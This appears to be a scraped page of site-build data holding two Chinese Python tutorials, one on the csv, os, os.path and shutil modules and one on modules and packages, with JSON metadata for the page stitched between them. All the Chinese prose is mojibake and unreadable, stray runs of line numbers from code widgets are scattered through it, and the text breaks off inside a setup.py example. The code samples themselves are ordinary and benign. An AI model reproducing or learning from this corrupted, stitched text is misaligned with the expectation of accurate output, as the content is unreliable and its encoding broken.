csvæä»¶æä½\n\ncsvæ¯ä¸ç§ä»¥éå·åéçææ¬æä»¶æ ¼å¼ï¼éå¸¸ç¨äºæ°æ®çäº¤æ¢ï¼excelæä»¶åæ°æ®åºçå¯¼å¥å¯¼åºï¼åexcelä¸åï¼csvçå¼æ²¡æç±»åï¼é½æ¯å­ç¬¦ä¸²ï¼æ²¡ææ ¼å¼ï¼æ²¡æå·¥ä½è¡¨ï¼æ²¡æå¾åã\n\npythonä¸­æ ååºæ¨¡åcsvæä¾äºä¸ä¸ªè¯»åcsvå¯¹è±¡çæ¹å¼ï¼\n\ncsv.readerè¯»åcsvæä»¶\n\nimport csv\nwith open("test.csv","r") as f:\n    f_csv = csv.reader(f)\n    headers = next(f_csv)\n    print(headers)\n    for row in f_csv:\n        print(row)\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\ncsv.writerå¯¹è±¡åå¥csvæä»¶\n\nimport csv\nheaders = ["å­¦å·","å§å","å¹´é¾"]\nrows = [\n    ("1001","zhangsan",12),\n    ("1002","æå",12)\n]\n\nwith open("testwrite.csv","w") as f:\n    f_csv = csv.writer(f)\n    f_csv.writerow(headers)\n    f_csv.writerows(rows)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# osåos.pathæ¨¡å\n\nosæ¨¡åå¯ä»¥å¸®å©æä»¬ç´æ¥å¯¹æä½ç³»ç»è¿è¡ç¸å³çæä½ãæä»¬å¯ä»¥ç´æ¥è°ç¨æä½ç³»ç»çå¯æ§è¡å½ä»¤ãæä»¶ç­ç­ã\n\n\n# osæ¨¡å\n\nos.systemå¯ä»¥å¸®å©æä»¬ç´æ¥è°ç¨ç³»ç»çå½ä»¤\n\nimport os\nos.system("whoami")\n\n\n1\n2\n\n\nè°ç¨pingå½ä»¤\n\nimport os\nos.system("whoami")\nos.system("ping -c 4 www.baidu.com")\n\n"""\nplankton\nping www.a.shifen.com (180.97.34.94): 56 data bytes\n64 bytes from 180.97.34.94: icmp_seq=0 ttl=55 time=15.469 ms\n64 bytes from 180.97.34.94: icmp_seq=1 ttl=55 time=19.000 ms\n64 bytes from 180.97.34.94: icmp_seq=2 ttl=55 time=19.176 ms\n64 bytes from 180.97.34.94: icmp_seq=3 ttl=55 time=19.265 ms\n\n--- www.a.shifen.com ping statistics ---\n4 packets transmitted, 4 packets received, 0.0% packet loss\nround-trip min/avg/max/stddev = 15.469/18.227/19.265/1.595 ms\n\n"""\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\nos.startfileè°ç¨å®è£å¥½çç¨åºï¼\n\nimport os\nos.startfile("æä»¶è·¯å¾")\n\n\n1\n2\n\n\n\n# osæ¨¡åæä½æä»¶\n\næä»¬åé¢éè¿openæä½æå¼æä»¶åå¥åè¯»åæä»¶çåå®¹ï¼å¦æéè¦å¯¹æä»¶åç®å½åå¶ä»çæä½ï¼åéè¦ä½¿ç¨osåos.pathæ¨¡åã\n\nosæ¨¡åä¸­å¸¸ç¨çæä½æä»¶çæ¹æ³ï¼\n\næ¹æ³å                æè¿°\nremove(path)       å é¤æå®çæä»¶\nrename(src,dest)   éå½åæä»¶æç®å½\nstat(path)         è¿åæä»¶çææå±æ§\nlistdir(path)      è¿å path ç®å½ä¸çæä»¶åç®å½åè¡¨\n\nosæ¨¡åä¸é¢å¸¸ç¨çæä½ç®å½çæ¹æ³ï¼\n\næ¹æ³å                                æè¿°\nmkdir(path)                        åå»ºç®å½\nmakedirs(path1/path2/path3/... )   åå»ºå¤çº§ç®å½\nrmdir(path)                        å é¤ç®å½\nremovedirs(path1/path2...)         å é¤å¤çº§ç®å½\ngetcwd()                           è¿åå½åå·¥ä½ç®å½ï¼current work dir\nchdir(path)                        æ path è®¾ä¸ºå½åå·¥ä½ç®å½\nwalk()                             éåç®å½æ \nsep                                å½åæä½ç³»ç»æä½¿ç¨çè·¯å¾åéç¬¦\n\nå©ç¨osåå»ºå é¤è·åæä»¶çä¿¡æ¯ï¼\n\nimport os\nprint(os.name) # posix\nprint(os.sep) # /\nprint(repr(os.linesep)) # \'\\n\'\n\nprint(os.stat("demo.py")) #os.stat_result(st_mode=33188, st_ino=3401315, st_dev=16777222, st_nlink=1, st_uid=501, st_gid=20, st_size=24107, st_atime=1648276062, st_mtime=1648276062, st_ctime=1648276062)\n\n#############æä½å·¥ä½ç®å½\nprint(os.getcwd())\nos.chdir("./")\n# os.mkdir("hello")\n############åå»ºç®å½ åå»ºå¤çº§ç®å½ å é¤ç®å½\n# os.rmdir("hello")\n# os.makedirs("hello/world")\n# os.removedirs("hello/world")\n# os.rename("test.csv","hello.csv")\n\ndirs = os.listdir("./")\nprint(dirs) # [\'helloworld.txt\', \'ccc.txt\', \'error.log\', \'hello.csv\', \'haha.ser\', \'demo.py\', \'testwrite.csv\', \'.idea\']\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# os.pathæ¨¡å\n\nos.pathæ¨¡åæä¾äºç®å½ç¸å³çæä½\n\næ¹æ³                   æè¿°\nisabs(path)          å¤æ­ path æ¯å¦ç»å¯¹è·¯å¾\nisdir(path)          å¤æ­ path æ¯å¦ä¸ºç®å½\nisfile(path)         å¤æ­ path æ¯å¦ä¸ºæä»¶\nexists(path)         å¤æ­æå®è·¯å¾çæä»¶æ¯å¦å­å¨\ngetsize(filename)    è¿åæä»¶çå¤§å°\nabspath(path)        è¿åç»å¯¹è·¯å¾\ndirname(p)           è¿åç®å½çè·¯å¾\ngetatime(filename)   è¿åæä»¶çæåè®¿é®æ¶é´\ngetmtime(filename)   è¿åæä»¶çæåä¿®æ¹æ¶é´\nwalk(top,func,arg)   éå½æ¹å¼éåç®å½\njoin(path,*paths)    è¿æ¥å¤ä¸ª path\nsplit(path)          å¯¹è·¯å¾è¿è¡åå²ï¼ä»¥åè¡¨å½¢å¼è¿å\nsplitext(path)       ä»è·¯å¾ä¸­åå²æä»¶çæ©å±å\n\n\n# walkéå½éåææçæä»¶åç®å½\n\nos.walkæ¹æ³ä¼è¿åä¸ä¸ª3ä¸ªåç´ çåç»ï¼\n\ndirpathï¼è¦ååºæå®ç®å½çè·¯å¾\n\ndirnamesï¼ç®å½ä¸çæææä»¶å¤¹\n\nfilenamesï¼ç®å½ä¸çæææä»¶\n\nä½¿ç¨walkéå½éåæææä»¶åç®å½\n\nimport os\n\nall_files = []\n\npath = os.getcwd()\nlistfiles = os.walk(path)\n\nfor dirpath,dirnames,filenames in listfiles:\n    for dir in dirnames:\n        all_files.append(os.path.join(dirpath,dir))\n    for name in filenames:\n        all_files.append(os.path.join(dirpath,name))\n\nfor file in all_files:\n    print(file)\n    \n"""\n/users/plankton/workspace/py/studypy/.idea\n/users/plankton/workspace/py/studypy/helloworld.txt\n/users/plankton/workspace/py/studypy/ccc.txt\n/users/plankton/workspace/py/studypy/error.log\n/users/plankton/workspace/py/studypy/hello.csv\n/users/plankton/workspace/py/studypy/haha.ser\n/users/plankton/workspace/py/studypy/demo.py\n/users/plankton/workspace/py/studypy/testwrite.csv\n/users/plankton/workspace/py/studypy/.idea/inspectionprofiles\n/users/plankton/workspace/py/studypy/.idea/studypy.iml\n/users/plankton/workspace/py/studypy/.idea/.gitignore\n/users/plankton/workspace/py/studypy/.idea/workspace.xml\n/users/plankton/workspace/py/studypy/.idea/modules.xml\n/users/plankton/workspace/py/studypy/.idea/misc.xml\n/users/plankton/workspace/py/studypy/.idea/inspectionprofiles/profiles_settings.xml\n"""\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n\n# shutilæ¨¡å æ·è´ååç¼©\n\nshutilæ¯pythonæ ååºæä¾çç¨äºæä»¶åæä»¶å¤¹æ·è´ç§»å¨å é¤ç­ï¼è¿å¯ä»¥ç¨äºæä»¶çåç¼©åè§£åç¼©æä½ã\n\nosæ¨¡åæä¾äºå¯¹äºç®å½åæä»¶çä¸è¬æä½ï¼shutilæ¨¡åä½ä¸ºè¡¥åï¼æä¾äºç§»å¨åç¼©å¤å¶è§£åç¼©ç­æä½ã\n\næä»¶æ·è´æä½ï¼\n\nimport shutil\nshutil.copy("helloworld.txt","helloworld1.txt")\n\n# éå½æ·è´\nshutil.copytree("../","hello",ignore=shutil.ignore_patterns("*.html","*.ser"))\n\n\n\n1\n2\n3\n4\n5\n6\n\n\nåç¼©åè§£åç¼©æä½ï¼\n\n# æä»¶åç¼©\nimport shutil\nimport zipfile\n\n# å°å½åæä»¶å¤¹çåå®¹åç¼©çæcode.zipæ¾å°ä¸ä¸çº§æä»¶å¤¹ä¸­\n# shutil.make_archive("../code","zip","./")\n\nz = zipfile.zipfile("a.zip","w")\nz.write("hello.csv")\nz.write("haha.ser")\nz.close()\n\n# è§£åç¼©\nz2 = zipfile.zipfile("a.zip","r")\nz2.extractall("../hello")\nz2.close()\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n',charsets:{cjk:!0},lastUpdated:"2022/04/03, 12:13:15",lastUpdatedTimestamp:1648987995e3},{title:"Pythonæ¨¡ååçé£äºäº",frontmatter:{title:"Pythonæ¨¡ååçé£äºäº",date:"2022-03-27T22:00:00.000Z",permalink:"/sec/dev/python/module",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å®å¨å¼å","Python"],tags:["Python"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/202.%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/2020.Python/07.Python%E6%A8%A1%E5%9D%97%E5%8C%96%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B.html",relativePath:"02.å®å¨/202.å®å¨å¼å/2020.Python/07.Pythonæ¨¡ååçé£äºäº.md",key:"v-aee8137e",path:"/sec/dev/python/module/",headers:[{level:2,title:"Pythonæ¨¡ååç®ä»",slug:"pythonæ¨¡ååç®ä»",normalizedTitle:"pythonæ¨¡ååç®ä»",charIndex:97},{level:2,title:"å¯¼å¥æ¨¡å",slug:"å¯¼å¥æ¨¡å",normalizedTitle:"å¯¼å¥æ¨¡å",charIndex:693},{level:3,title:"importå¯¼å¥æ¨¡å",slug:"importå¯¼å¥æ¨¡å",normalizedTitle:"importå¯¼å¥æ¨¡å",charIndex:1277},{level:3,title:"from importå¯¼å¥",slug:"from-importå¯¼å¥",normalizedTitle:"from importå¯¼å¥",charIndex:1984},{level:3,title:"import å from importçåºå«",slug:"import-å-from-importçåºå«",normalizedTitle:"import å from importçåºå«",charIndex:2216},{level:3,title:"__import__()å¨æå¯¼å¥",slug:"import-å¨æå¯¼å¥",normalizedTitle:"<strong>import</strong>()å¨æå¯¼å¥",charIndex:null},{level:3,title:"æ¨¡åçå è½½",slug:"æ¨¡åçå è½½",normalizedTitle:"æ¨¡åçå è½½",charIndex:2506},{level:3,title:"å¨æå è½½",slug:"å¨æå è½½",normalizedTitle:"å¨æå è½½",charIndex:2593},{level:2,title:"package å",slug:"package-å",normalizedTitle:"package å",charIndex:2709},{level:3,title:"å¯¼å¥å",slug:"å¯¼å¥å",normalizedTitle:"å¯¼å¥å",charIndex:2870},{level:3,title:"å¯¼å¥æå",slug:"å¯¼å¥æå",normalizedTitle:"å¯¼å¥æå",charIndex:3446},{level:3,title:"ååå¼ç¨",slug:"ååå¼ç¨",normalizedTitle:"ååå¼ç¨",charIndex:3643},{level:3,title:"sys.pathåæ¨¡åçæç´¢è·¯å¾",slug:"sys-pathåæ¨¡åçæç´¢è·¯å¾",normalizedTitle:"sys.pathåæ¨¡åçæç´¢è·¯å¾",charIndex:3726},{level:2,title:"æ¨¡åçåå¸åå®è£",slug:"æ¨¡åçåå¸åå®è£",normalizedTitle:"æ¨¡åçåå¸åå®è£",charIndex:4154},{level:3,title:"æ¬å°å®è£æ¨¡å",slug:"æ¬å°å®è£æ¨¡å",normalizedTitle:"æ¬å°å®è£æ¨¡å",charIndex:4690},{level:3,title:"ä¸ä¼ å°PyPI",slug:"ä¸ä¼ å°pypi",normalizedTitle:"ä¸ä¼ å°pypi",charIndex:4822},{level:3,title:"ä½¿ç¨ä»äººçæ¨¡å",slug:"ä½¿ç¨ä»äººçæ¨¡å",normalizedTitle:"ä½¿ç¨ä»äººçæ¨¡å",charIndex:5200},{level:2,title:"åº",slug:"åº",normalizedTitle:"åº",charIndex:414},{level:3,title:"Pythonæ ååº",slug:"pythonæ ååº",normalizedTitle:"pythonæ ååº",charIndex:483},{level:3,title:"ç¬¬ä¸æ¹åº",slug:"ç¬¬ä¸æ¹åº",normalizedTitle:"ç¬¬ä¸æ¹åº",charIndex:3872}],headersStr:"Pythonæ¨¡ååç®ä» å¯¼å¥æ¨¡å importå¯¼å¥æ¨¡å from importå¯¼å¥ import å from importçåºå« __import__()å¨æå¯¼å¥ æ¨¡åçå è½½ å¨æå è½½ package å å¯¼å¥å å¯¼å¥æå ååå¼ç¨ sys.pathåæ¨¡åçæç´¢è·¯å¾ æ¨¡åçåå¸åå®è£ æ¬å°å®è£æ¨¡å ä¸ä¼ å°PyPI ä½¿ç¨ä»äººçæ¨¡å åº Pythonæ ååº ç¬¬ä¸æ¹åº",content:'# Pythonæ¨¡ååçé£äºäº\n\néçç¨åºçè¶æ¥è¶å¤æï¼å¯¹äºä»£ç çç®¡çæ¾å¾è³å³éè¦ãPythonä¸­å¯¹äºä»£ç çç®¡çæ¯åºäºæ¨¡åååå®ç°çãè¿ä¸ç¯å°±æ´çä¸ä¸å³äºPythonæ¨¡ååçç®åç¨æ³ã\n\n\n# Pythonæ¨¡ååç®ä»\n\nPythonç¨åºæ¯ç±æ¨¡åç»æçï¼ä¸ä¸ªæ¨¡åå°±å¯¹åºäºä¸ä¸ªPythonæä»¶ãèæ¨¡åæ¯ç±è¯­å¥ç»æçï¼è¿è¡Pythonç¨åºæ¶ï¼æç§æ¨¡åä¸­çè¯­å¥çé¡ºåºæ§è¡ä»£ç ãè¯­å¥æ¯Pythonç¨åºçæé ååï¼ä¸»è¦ç¨äºåå»ºå¯¹è±¡ãç»åéèµå¼ãè°ç¨å½æ°ãæ§å¶è¯­å¥ç­ç­ã\n\næ¨¡ååç¼ç¨å¯¹äºPythonèè¨è³å³éè¦ï¼æ¨¡åä¸­å¯ä»¥å®ä¹åéå½æ°ãç±»ãæ®éè¯­å¥ç­ãæä»¬å¯ä»¥å°ä¸ä¸ªå¤æçPythonç¨åºåè§£ä¸ºå¤ä¸ªæ¨¡åï¼ä¾¿äºåæçéç¨åè°ç¨ãæ¨¡ååç¼ç¨æä¸é¢çå ä¸ªä¼å¿ï¼\n\n 1. ä¾¿äºå°ä¸ä¸ªä»»å¡åè§£ä¸ºå¤ä¸ªæ¨¡åï¼å®ç°å¢éåé¨çååå¼åï¼å®æå¤§è§æ¨¡ç¨åº\n 2. å®ç°ä»£ç çå¤ç¨ï¼ä¸ä¸ªæ¨¡åå¯ä»¥è¢«åå¤å¤æ¬¡è°ç¨\n 3. å¯ç»´æ¤æ§è¾å¼º\n\nPythonä¸­æä¾äºä¸ä¸ªæ ååºæ¨¡åï¼åæ¬æä¾äºæä½ç³»ç»åè½ãç½ç»éä¿¡ãææ¬å¤çãæä»¶å¤çãæ°å­¦è¿ç®ç­ç­ãåæ¶Pythonçä½¿ç¨èè¿å¼å¼æºäºå¤§éçç¬¬ä¸æ¹æ¨¡åï¼ä½¿ç¨æ¹æ³åPythonæ ååºç±»ä¼¼ãåè½è¦çäºæ¹æ¹é¢é¢ã\n\næ¨¡ååç¼ç¨çåºæ¬æµç¨\n\n 1. è®¾è®¡APIï¼è¿è¡åè½çæè¿°\n 2. ç¼ç å®ç°APIä¸­æè¿°çåè½\n 3. ç¼åæµè¯ä»£ç ï¼å¹¶æ¶é¤å¨å±ä»£ç \n 4. ä½¿ç¨ç§æå½æ°æ¯å¿åä¸è¢«å¤é¨å®¢æ·ç«¯è°ç¨çå½æ°æ¨¡åå½æ°\n\næ¨¡ååç¼ç¨ä¸­ï¼æéè¦çå°±æ¯è¦åè®¾è®¡åºæ¨¡åçAPIï¼ç¶åå¼å§ç¼åä»£ç ï¼å®ç°APIä¸­æè¿°çåè½ï¼æåï¼å¨å¶ä»æ¨¡åä¸­å¯¼å¥æ¬æ¨¡åè¿è¡è°ç¨ãæä»¬éè¿helpæ¥çæ¨¡åçAPIï¼ä¸è¬ä½¿ç¨æ¶åå¯¼å¥æ¨¡åï¼ç¶åéè¿helpå½æ°æ¥çã\n\n"""\næ¬æ¨¡åç¨äºè®¡ç®åå·¥çå·¥èµ\n"""\n\ncompany = "sgg"\ndef yearSalary(monthSalary):\n    """æ ¹æ®ä¼ å¥çæèªè®¡ç®å¹´èª"""\n    pass\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\næ¯ä¸ªæ¨¡åé½æä¸ä¸ªåç§°ï¼éè¿ç¹æ®åé__name__å¯ä»¥è·åæ¨¡åçåç§°ï¼å¨æ­£å¸¸æåµä¹ä¸ï¼æ¨¡åçåç§°å¯¹åºçæºæä»¶åï¼ä½æ¯ï¼å¦æå½ä¸ä¸ªæ¨¡åè¢«å½ä½ç¨åºçå¥å£æ¶ï¼å¶åç§°ä¸º__main__ãæä»¬å¯ä»¥æ ¹æ®è¿ä¸ªç¹ç¹ï¼å°æ¨¡åæºä»£ç æä»¶ä¸­çæµè¯ä»£ç è¿è¡å¯¹ç«å¤çã\n\n"""\næ¬æ¨¡åç¨äºè®¡ç®åå·¥çå·¥èµ\n"""\n\ncompany = "sgg"\ndef yearSalary(monthSalary):\n    """æ ¹æ®ä¼ å¥çæèªè®¡ç®å¹´èª"""\n    pass\n\n\n# æµè¯ä»£ç å¯ä»¥è¿æ ·å\nif __name__ == "__main__":\n    print("hello")\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\næä»¬å¯ä»¥å¨æ¨¡åçç¬¬ä¸è¡æ·»å ä¸ä¸ªææ¡£å­ç¬¦ä¸²ï¼ç¨äºæè¿°æ¨¡åçç¸å³åè½ï¼ç¶åä½¿ç¨__doc__å¯ä»¥è·åææ¡£å­ç¬¦ä¸²çåå®¹ã\n\n\n# å¯¼å¥æ¨¡å\n\næ¨¡åè®¾è®¡çå¥½å¤ä¹ä¸å°±æ¯ä½¿ä»£ç çå¤ç¨æ§åé«ï¼åå¥½çæ¨¡åå¯ä»¥è¢«ä»»æçåå¤çè°ç¨ãæ¨¡åçå¯¼å¥å°±æ¯å¨æ¬æ¨¡åä¸­ä½¿ç¨å¶ä»çæ¨¡åã\n\n\n# importå¯¼å¥æ¨¡å\n\nimport å¯ä»¥ç´æ¥å¯¼å¥ä¸ä¸ªæå¤ä¸ªæ¨¡åï¼å¹¶å¯ä»¥ç»å¯¼å¥çæ¨¡åéå½åãå¨ä½¿ç¨importå è½½æ¨¡åæ¶åä¸ºåä¸ªç±»å«ï¼\n\n 1. ä½¿ç¨Pythonç¼åçä»£ç \n 2. å·²ç»è¢«ç¼è¯ä¸ºå±äº«åºæèddlçcæC++æ©å±\n 3. ä¸ä¸ªä¸ç»æ¨¡åçå\n 4. ä½¿ç¨cç¼åå¹¶é¾æ¥å°pythonä¸­çåç½®çæ¨¡å\n\næä»¬ä¸è¬éè¿importè¯­å¥å®ç°æ¨¡åçå¯¼å¥åä½¿ç¨ï¼importè¯­å¥å®éä¸æ¯ä½¿ç¨äºåç½®å½æ°__import__()ãå½æä»¬éè¿importå¯¼å¥ä¸ä¸ªæ¨¡åæ¶ï¼Pythonè§£éå¨è¿è¡æ§è¡ï¼å¹¶å£°ç§°ä¸ä¸ªå¯¹è±¡ï¼è¿ä¸ªå¯¹è±¡å°±ä»£è¡¨äºè¢«å è½½çæ¨¡åã\n\nimport math\nprint(id(math)) # 140277795567584\nprint(type(math)) # <class \'module\'>\nprint(math.pi) # 3.141592653589793\n\n\n1\n2\n3\n4\n\n\nå½æä»¬å¯¼å¥äºä¸ä¸ªæ¨¡åçæ¶åï¼ä¼çæä¸ä¸ªmoduleçç±»çå¯¹è±¡ï¼è¯¥å¯¹è±¡åmathåéå¼ç¨ï¼å¯ä»¥éè¿mathåéå»è®¿é®åå¼ç¨æ¨¡åä¸­çææåå®¹ãæä»¬éè¿importå¯¼å¥å¤ä¸ªæ¨¡åæ¶ï¼æ¬è´¨ä¸ä¹æ¯çæäºmoduleçå¤ä¸ªç±»å¯¹è±¡èå·²ãææ¶åï¼æä»¬éè¦ç»æ¨¡åèµ·ä¸ä¸ªå«åï¼æ¬è´¨ä¸ï¼è¿ä¸ªå«åä»ä»æ¯æ°åå»ºä¸ä¸ªåéæ¿ä»£é»è®¤çåéåå¼ç¨moduleå¯¹è±¡èå·²ã\n\nimport math,os\nprint(type(os)) # <class \'module\'>\nprint(type(math)) # <class \'module\'>\n\nimport math as m\n\nprint(m.pi)\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# from importå¯¼å¥\n\nPythonä¸­å¯ä»¥ä½¿ç¨from importå¯¼å¥æ¨¡åä¸­çæåï¼å¯¼å¥çæ ¼å¼å¦ä¸ï¼\n\nfrom æ¨¡åå import æå1ï¼æå2\t\n\n\n1\n\n\nå¦æå¸æå¯¼å¥ä¸ä¸ªæ¨¡åä¸­çæææåï¼åå¯ä»¥éç¨å¯¼å¥æå·çæ¹æ³ï¼from æ¨¡åå import *\n\nä½æ¯åºè¯¥å°½éçå»é¿åè¿ç§åæ³ï¼å ä¸ºæå·ä»£è¡¨çæ¯å¯¼å¥æ¨¡åä¸­ææéä¸åçº¿å¼å¤´çåç§°ï¼å°é£æ¶å¦æä½ ä¸ç¥éä½ å¯¼å¥çæ¨¡åä¸­æåªäºåå­ï¼å°±å¯è½è¦çæä½ èªå·±çå®ä¹çåéï¼å¯¼è´å¯è¯»æ§åå·®ï¼æéå°é¾ã\n\n\n# import å from importçåºå«\n\nimportå¯¼å¥çæ¯æ¨¡åï¼èfrom importå¯¼å¥çæ¯æ¨¡åä¸­çä¸ä¸ªå½æ°æèä¸ä¸ªç±»ã\n\nå¯ä»¥ç®åççè§£çè¯ï¼importå¯¼å¥çæ¯ä¸ä¸ªæä»¶ï¼èfrom importå¯¼å¥çæ¯è¿ä¸ªæä»¶ä¸çåå®¹ãå¦æä½¿ç¨importå¯¼å¥çè¯ï¼å°±éè¦ä½¿ç¨æä»¶åç§°è°ç¨å·ä½çæä»¶éé¢çåå®¹ã\n\n\n# __import__()å¨æå¯¼å¥\n\nimportæ¬è´¨ä¸æ¯è°ç¨çåç½®çå½æ°__import__(),æä»¬å¯ä»¥éè¿å®å®ç°å¨æå¯¼å¥ã__import__()å¨æä¼ éä¸éåæ°å¼ï¼å°±è½å¯¼å¥ä¸éçæ¨¡åãä¸è¬æä»¬ä¸å»ºè®®èªè¡ä½¿ç¨__import__()è¿è¡å¯¼å¥ã\n\n\n# æ¨¡åçå è½½\n\nå½ä¸ä¸ªæ¨¡åè¢«å¯¼å¥æ¶ï¼æ¨¡åä¸­çä»£ç å°±ä¼è¢«æ§è¡ï¼å¦æåæ¬¡å¯¼å¥è¿ä¸ªæ¨¡ååä¸ä¼åæ¬¡æ§è¡ãä¸ä¸ªæ¨¡åæ è®ºå¯¼å¥äºå¤å°æ¬¡ï¼è¿ä¸ªæ¨¡åå¨æ´ä¸ªè¿ç¨ä¸­ï¼æä¸åªæä¸ä¸ªå®ä¾å¯¹è±¡ã\n\n\n# å¨æå è½½\n\nææ¶åæä»¬ç¡®å®éè¦éæ°å è½½ä¸ä¸ªæ¨¡åï¼åå¯ä»¥ä½¿ç¨ï¼importlib.reload()æ¹æ³ã\n\nimport calc_salary\n\nimportlib.reload(calc_salary)\n\n\n1\n2\n3\n\n\n\n# package å\n\nå½ä¸ä¸ªé¡¹ç®ä¸­å­å¨å¤ä¸ªæ¨¡åçæ¶åï¼å°±éè¦åæ¬¡è¿è¡ç»ç»ï¼æä»¬å°å·æç¸ååè½çç±»ä¼¼çæ¨¡åæ¾å°ä¸èµ·ï¼å½¢æäºä¸ä¸ªåï¼ä¸ä¸ªåå¿é¡»è¦åå«ä¸ä¸ª__init__.pyçæä»¶ï¼åä¸­å¯ä»¥åå«æ¨¡åï¼ä¹å¯ä»¥åå«å­åã\n\nå¨Pycharmä¸­åå»ºåæ¶ï¼Pycharmä¼èªå¨å¸®æçæä¸ä¸ªå¸¦æ__init__.pyçæä»¶å¤¹ã\n\n\n# å¯¼å¥å\n\nå½æä»¬éè¦å¯¼å¥æä¸ªaaåä¸çmoduleAAæ¨¡åæ¶ï¼éè¦ä»¥ä¸æ¹æ³ï¼\n\n 1. Import aa.moduleAA\n    \n    å¨ä½¿ç¨æ¶ï¼éè¦å®æ´çåç§°æ¥å¼ç¨ï¼aa.moduleAA.func()\n\n 2. from aa import moduleAA\n    \n    å¨ä½¿ç¨æ¶ï¼å¯ä»¥ç´æ¥ä½¿ç¨æ¨¡ååï¼moduleAA.func()\n\n 3. from aa.moduleAA import func\n    \n    å¨ä½¿ç¨æ¶å¯ä»¥ç´æ¥ä½¿ç¨å½æ°åï¼func()\n\nå¯¼å¥åçæ¬è´¨æ¯å¯¼å¥äºåä¸­ç__init__.pyæä»¶ï¼ä¹å°±æ¯è¯´ï¼å¯¼å¥äºimport pack1å°±æ¯å¯¼å¥å¹¶æ§è¡äºpack1åä¸ç__init__.pyæä»¶ãè¿æ ·ï¼æä»¬å°±å¯ä»¥å¨__init__()æ¨¡åä¸­æ¹éå¯¼å¥æä»¬éè¦çæ¨¡åï¼ä¸éè¦ä¸ä¸å¯¼å¥ã\n\n__init__.pyçä¸ä¸ªä½ç¨ï¼\n\n 1. è¯å«å\n 2. å®ç°æ¨¡ç³å¯¼å¥\n 3. ååå§åï¼ç»ä¸å¯¼å¥ä»£ç ãæ¹éå¯¼å¥\n\nteståä¸ç__init__.py\n\nimport turtle\nimport math\n\nprint("å¯¼å¥äºtestå")\n\n\n1\n2\n3\n4\n\n\nå¨demoåä¸­å¯¼å¥äºteståï¼å¹¶ä½¿ç¨teståä¸­å¯¼å¥çmath\n\nimport test\nprint(test.math.pi)\n\n\n1\n2\n\n\n\n# å¯¼å¥æå\n\nimport *çè®ºä¸æä»¶ç³»ç»å¯ä»¥æ¾åºææçå­æ¨¡åï¼å¹¶è¿è¡å¯¼å¥ãä½æ¯è¿åè±è´¹å¤§éçæ¶é´ãPythonæä¾äºä¸ç§åç´¢å¼çæ¹å¼ã\n\nè¿ä¸ªç´¢å¼å¯ä»¥å¨__imit__.pyæä»¶ä¸­å®ä¹ä¸ä¸ª__all__åéï¼å¹¶å°å¯¹åºåä¸çææçæ¨¡åä½ä¸ºåè¡¨åå®¹å­å¥å°__all__ä¸­ï¼è¿æ ·ï¼ä½¿ç¨from test import *å¯¼å¥çå°±æ¯__all__åè¡¨ä¸­çæææ¨¡åäºãä½æ¯ä»ç¶ä¸å»ºè®®è¿æ ·å¯¼å¥ã\n\n\n# ååå¼ç¨\n\nå¦ææ¯å­ååçå¼ç¨ï¼å¯ä»¥æç§ç¸åºçä½ç½®å¼å¥å­æ¨¡åï¼\n\nfrom . import calc\nfrom .. import demo\n\n\n1\n2\n\n\n\n# sys.pathåæ¨¡åçæç´¢è·¯å¾\n\nå½æä»¬å¯¼å¥æä¸ªæ¨¡åæä»¶æ¶ï¼Pythonçè§£éå¨æ¯å¦ä½å¯»æ¾è¿ä¸ªæä»¶å¹¶å è½½çå¢ï¼ä¸è¬æç§å¦ä¸çé¡ºåºå¯»æ¾ï¼å¦ææåæ¾ä¸å°å°±ä¼æ¥éï¼\n\n 1. åç½®æ¨¡å\n 2. å½åç®å½\n 3. å½åç¨åºçä¸»ç®å½\n 4. pythonpathç®å½\n 5. æ åé¾æ¥åºç®å½\n 6. ç¬¬ä¸æ¹åºç®å½site-packages\n 7. .pthæä»¶çåå®¹\n 8. sys.path.append()æ·»å çä¸´æ¶ç®å½\n\nå½ä»»ä½ä¸ä¸ªpythonç¨åºå¯å¨çæ¶åï¼é½ä¼æç§ä¸é¢çè·¯å¾æç´¢æ¶éï¼å¹¶æ¾å°sysæ¨¡åçpathå±æ§ä¸­ã\n\næä»¬å¯ä»¥éè¿ä»£ç å¾sys.pathä¸­æ·»å åå®¹ï¼\n\nimport sys\nsys.path.append("/")\n\n\n1\n2\n\n\n\n\nPythonpathéè¿æ·»å ç¯å¢åéè®¾ç½®\n\n.pthæä»¶ï¼å¯ä»¥å¨site-packagesç®å½ä¸æ·»å å¦ä¸çåå®¹ï¼\n\n# ä¸è¡åä¸ä¸ª\n/aaa/aa/a\n/bbb/bb/b\n\n\n1\n2\n3\n\n\n\n# æ¨¡åçåå¸åå®è£\n\nå½æä»¬å®ææä¸ªæ¨¡åçå¼ååï¼å¯ä»¥å°å¶å¯¹å¤åå¸ï¼å¶ä»å¼åçå¯ä»¥ä»¥ç¬¬ä¸æ¹æ©å±åºçæ¹å¼ä½¿ç¨æä»¬çæ¨¡åãæ¨¡åçåå¸æ­¥éª¤å¦ä¸ï¼\n\n 1. ä¸ºæ¨¡ååå»ºå¦ä¸çç»ææä»¶å¤¹ï¼ä¸è¬æåµä¸æä»¶å¤¹çåå­åæ¨¡ååå­ä¸è´ï¼\n\n\n\n 2. å¨æä»¶å¤¹ä¸­åå»ºä¸ä¸ªsetup.pyæä»¶ï¼æä»¶åå®¹å¦ä¸ï¼\n    \n    setup(\n    \n    # å¯¹å¤æä»¬æ¨¡åçåå­\n    name=\'\', version=\'1.0\', # çæ¬å· 